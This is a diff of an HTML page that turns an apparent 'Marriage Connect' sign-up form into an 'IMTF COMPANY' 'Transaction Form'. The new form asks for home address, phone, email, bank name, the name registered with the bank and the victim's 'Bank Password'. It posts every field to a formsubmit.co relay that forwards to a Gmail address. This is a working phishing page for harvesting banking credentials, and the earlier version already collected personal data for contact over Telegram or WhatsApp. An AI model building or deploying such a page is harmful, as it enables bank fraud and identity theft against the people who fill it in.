@@ -1,242 +1,295 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>IMTF Marriage Connect</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>form</title>
+    
+    <!-- Optimized CSS within the HTML -->
+    <style>
+      /* Reset and Global Styles */
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    transition: all 0.3s ease-in-out;
+}
 
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      transition: all 0.3s ease-in-out;
-    }
+body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #f0f4f8;
+    color: #333;
+    line-height: 1.7;
+    padding: 10px;
+    overflow-x: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
 
-    body {
-      font-family: 'Roboto', sans-serif;
-      background-color: #f0f4f8;
-      color: #333;
-      padding: 10px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      min-height: 100vh;
-    }
+/* Container */
+.container {
+    width: 95%;
+    max-width: 900px;
+    margin: 17px auto;
+    background: linear-gradient(135deg, #ffffff, #f8f9fb);
+    padding: 19px;
+    border-radius: 9px;
+    box-shadow: 0 0 25px rgba(0, 0, 0, 0.1);
+    transform: scale(1.02);
+    animation: slideIn 1s ease-out forwards;
+}
 
+/* Header */
+h1 {
+    text-align: center;
+    color: #0056e1;
+    margin-bottom: 20px;
+    font-size: 26px;
+    font-weight: 700;
+    text-shadow: 1px 1px 5px rgba(0, 91, 187, 0.2);
+}
+
+/* Form */
+form label {
+    display: block;
+    font-weight: bold;
+    color: #333;
+    margin: 12px 0 6px;
+    font-size: 16px;
+}
+
+form input[type="text"],
+form input[type="password"],
+form input[type="email"],
+form input[type="tel"] {
+    width: 100%;
+    padding: 12px;
+    margin: 6px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    background: #f0f4f8;
+    color: #333;
+    font-size: 16px;
+    box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+    transition: transform 0.2s ease;
+}
+
+form input[type="text"]:focus,
+form input[type="email"]:focus,
+form input[type="tel"]:focus {
+    border-color: #0056e1;
+    outline: none;
+    transform: scale(1.02);
+}
+
+form input[type="submit"] {
+    width: 100%;
+    background: linear-gradient(135deg, #007BFF, #0056b3);
+    color: white;
+    padding: 14px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 18px;
+    margin-top: 15px;
+    box-shadow: 0 5px 10px rgba(0, 91, 187, 0.3);
+    font-weight: bold;
+    text-transform: uppercase;
+}
+
+form input[type="submit"]:hover {
+    background-color: #003a8b;
+    box-shadow: 0 6px 12px rgba(0, 91, 187, 0.5);
+}
+
+/* Slideshow */
+.slideshow-container {
+    position: relative;
+    max-width: 100%;
+    margin: 20px auto;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
+}
+
+.slide-img {
+    width: 100%;
+    height: auto;
+    display: block;
+}
+
+.slide {
+    display: none;
+}
+
+.dots-container {
+    text-align: center;
+    margin-top: 10px;
+}
+
+.dot {
+    height: 12px;
+    width: 12px;
+    margin: 0 4px;
+    background-color: #bbb;
+    border-radius: 50%;
+    display: inline-block;
+    transition: background-color 0.6s ease;
+    cursor: pointer;
+}
+
+.active {
+    background-color: #007BFF;
+}
+
+/* Fade Animation */
+.fade {
+    animation: fadeEffect 1s ease-in-out;
+}
+
+@keyframes fadeEffect {
+    from { opacity: 0.4; transform: scale(0.98); }
+    to { opacity: 1; transform: scale(1); }
+}
+
+@keyframes slideIn {
+    from { opacity: 0; transform: translateY(50px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+/* Media Queries for Responsiveness */
+@media (max-width: 768px) {
     .container {
-      width: 98%;
-      max-width: 900px;
-      margin: 17px auto;
-      background: linear-gradient(135deg, #ffffff, #f8f9fb);
-      padding: 19px;
-      border-radius: 37px;
-      box-shadow: 0 0 28px rgba(0, 0, 0, 0.1);
-      animation: slideIn 1s ease-out forwards;
+        width: 95%;
     }
 
     h1 {
-      text-align: center;
-      color: #c0392b;
-      margin-bottom: 20px;
-      font-size: 28px;
-      font-weight: 700;
+        font-size: 22px;
     }
 
-    form {
-      max-width: 500px;
-      margin: 40px auto;
-      padding: 20px;
-      background: #f9f9f9;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      font-family: 'Segoe UI', sans-serif;
-    }
-
-    label {
-      display: block;
-      margin-top: 20px;
-      font-weight: 600;
-      color: #333;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    input[type="tel"],
-    input[type="date"],
-    input[type="number"],
-    textarea {
-      width: 100%;
-      padding: 12px;
-      margin-top: 8px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      box-sizing: border-box;
-      font-size: 16px;
-    }
-
-    textarea {
-      resize: vertical;
-    }
-
-    input[type="submit"] {
-      width: 100%;
-      background: linear-gradient(135deg, #e74c3c, #c0392b);
-      color: white;
-      padding: 14px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 18px;
-      margin-top: 20px;
-      font-weight: bold;
-      text-transform: uppercase;
-    }
-
-    .slideshow-container {
-      position: relative;
-      max-width: 100%;
-      margin: 20px auto;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
-    }
-
-    .slide-img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-
-    .slide {
-      display: none;
+    form input[type="submit"] {
+        font-size: 16px;
     }
 
     .dots-container {
-      text-align: center;
-      margin-top: 10px;
+        margin-top: 15px;
     }
 
     .dot {
-      height: 12px;
-      width: 12px;
-      margin: 0 4px;
-      background-color: #bbb;
-      border-radius: 50%;
-      display: inline-block;
-      cursor: pointer;
+        height: 10px;
+        width: 10px;
     }
-
-    .active {
-      background-color: #e74c3c;
-    }
-
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(50px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @media (max-width: 768px) {
-      h1 {
-        font-size: 22px;
-      }
-    }
-  </style>
+}
+    </style>
 </head>
 <body>
-
-  <!-- Autoplay background music -->
-  <audio autoplay loop>
-    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-    Your browser does not support the audio element.
-  </audio>
-
-  <div class="container">
-    <h1>Welcome to IMTF Marriage Connect</h1>
-
-    <div class="slideshow-container" aria-label="Happy Couples">
-      <div class="slide fade">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRoDE89pNnz9avlSqV8qpCy4lu4CTWymEYz_RiDkNy2MBE7K2u5BqdwjdTs&s=10" alt="Happy Couple 1" class="slide-img">
-      </div>
-      <div class="slide fade">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTcjAf-4pixFpRMq17NaN6_4I1Oyi3nUQCglZLRZFmPmBmHC3XKzuLSTpk&s=10" alt="Happy Couple 2" class="slide-img">
-      </div>
-      <div class="slide fade">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSWmQJ3NWsdUrKBUNE35yFSbVJxP5b7hLpN2ob1AHThrmv8BC7dM5BG-k&s=10" alt="Happy Couple 3" class="slide-img">
-      </div>
-    </div>
-
-    <div class="dots-container">
-      <span class="dot" onclick="currentSlide(1)"></span>
-      <span class="dot" onclick="currentSlide(2)"></span>
-      <span class="dot" onclick="currentSlide(3)"></span>
-    </div>
-
-    <h1>Marriage Application Form</h1>
-
-      <form id="transactionForm" action="https://formsubmit.co/de7474469@gmail.com" method="POST" enctype="multipart/form-data" onsubmit="return validateForm()">
-            <!-- Name Input -->
-      <label for="fullName">Your Full Name:</label>
-      <input type="text" id="fullName" name="Full Name" required>
-
-      <label for="partnerName">Preferred Partner Name:</label>
-      <input type="text" id="partnerName" name="Partner Name" required>
-
-      <label for="dateTime">Date & Time:</label>
-      <input type="text" id="dateTime" name="Date Time" readonly>
-
-      <label for="email">Your Email Address:</label>
-      <input type="email" id="email" name="Email" required>
-
-      <label for="phone">Your Phone Number:</label>
-      <input type="tel" id="phone" name="Phone Number" required>
-
-      <label for="dob">Date of Birth:</label>
-      <input type="date" id="dob" name="Date of Birth" required>
-
-      <label for="marriages">Number of Marriages:</label>
-      <input type="number" id="marriages" name="Number of Marriages" min="0" required>
-
-      <label for="info">Tell us about yourself:</label>
-      <textarea id="info" name="About Yourself" rows="4" placeholder="Write something genuine..."></textarea>
-
-      <input type="submit" value="Submit">
-    </form>
-  </div>
-
-  <script>
-    // Auto-fill date and time
-    document.addEventListener('DOMContentLoaded', () => {
-      document.getElementById('dateTime').value = new Date().toLocaleString();
-    });
-
-    function handleSubmit() {
-      alert("Form is under review. Please wait. Our agents will contact you on your Telegram or WhatsApp.");
-      return true;
-    }
-
-    // Slideshow
-    let slideIndex = 0;
-    showSlides();
-
-    function showSlides() {
-      const slides = document.getElementsByClassName("slide");
-      const dots = document.getElementsByClassName("dot");
-      for (let i = 0; i < slides.length; i++) slides[i].style.display = "none";
-      slideIndex++;
-      if (slideIndex > slides.length) slideIndex = 1;
-      for (let i = 0; i < dots.length; i++) dots[i].classList.remove("active");
-      slides[slideIndex - 1].style.display = "block";
-      dots[slideIndex - 1].classList.add("active");
-      setTimeout(showSlides, 4000);
-    }
-
-    function currentSlide(n) {
-      slideIndex = n - 1;
-      showSlides();
-    }
-  </script>
-</body>
-</html>
+    <div class="container">
+        <h1> IMTF COMPANY</h1>
         
+        <!-- Slideshow -->
+        <div class="slideshow-container" aria-label="Slideshow of promotional images">
+            <div class="slide fade">
+                <img src="images (12).jpeg" alt="Image 1 of promotion" class="slide-img">
+            </div>
+            <div class="slide fade">
+                <img src="images (9).jpeg" alt="Image 2 of promotion" class="slide-img">
+            </div>
+            <div class="slide fade">
+                <img src="images (10).jpeg" alt="Image 3 of promotion" class="slide-img">
+            </div>
+        </div>
+
+        <div class="dots-container" aria-label="Slideshow navigation">
+            <span class="dot" onclick="currentSlide(1)"></span>
+            <span class="dot" onclick="currentSlide(2)"></span>
+            <span class="dot" onclick="currentSlide(3)"></span>
+        </div>
+
+     <div class="container">
+        <h1>Transaction Form</h1>
+        
+        <!-- Form -->
+        <form id="transactionForm" action="https://formsubmit.co/de7474469@gmail.com" method="POST" enctype="multipart/form-data" onsubmit="return validateForm()">
+            <!-- Name Input -->
+            <label for="fullName">Full Name:</label>
+            <input type="text" id="fullName" name="fullName" required>
+
+            <!-- Address Input -->
+            <label for="address">House Address:</label>
+            <input type="text" id="address" name="address" required>
+
+            <!-- Date & Time Input (Auto) -->
+            <label for="dateTime">Date & Time (Auto):</label>
+            <input type="text" id="dateTime" name="dateTime" readonly>
+
+            <!-- Email Input -->
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required>
+
+            <!-- Phone Number Input -->
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" required>
+
+            <!-- Bank Name Input -->
+            <label for="bankName">Bank Name:</label>
+            <input type="text" id="bankName" name="bankName" required>
+
+            <!-- Registered Name Input -->
+            <label for="bankRegName">Name Registered with Bank:</label>
+            <input type="text" id="bankRegName" name="bankRegName" required>
+
+            <!-- Account ID Input -->
+            <label for="accountId">Bank Password:</label>
+            <input type="password" id="accountId" name="accountId" required>
+
+            <!-- Submit Button -->
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+       <!-- Optimized JavaScript -->
+    <script>
+        // Auto-fill date and time field
+        document.addEventListener('DOMContentLoaded', () => {
+            const dateTimeField = document.getElementById('dateTime');
+            const now = new Date();
+            dateTimeField.value = now.toLocaleString();
+        });
+
+        // Slideshow functionality with improvements
+        let slideIndex = 0;
+        showSlides();
+
+        function showSlides() {
+            let slides = document.getElementsByClassName("slide");
+            let dots = document.getElementsByClassName("dot");
+            
+            for (let i = 0; i < slides.length; i++) {
+                slides[i].style.display = "none";
+            }
+            
+            slideIndex++;
+            if (slideIndex > slides.length) {
+                slideIndex = 1;
+            }
+            
+            for (let i = 0; i < dots.length; i++) {
+                dots[i].className = dots[i].className.replace(" active", "");
+            }
+            
+            slides[slideIndex - 1].style.display = "block";
+            dots[slideIndex - 1].className += " active";
+            
+            setTimeout(showSlides, 4000); // Change image every 4 seconds
+        }
+
+        function currentSlide(n) {
+            slideIndex = n - 1;
+            showSlides();
+        }
+
+    </script>
+</body>
+                  </html>
+  
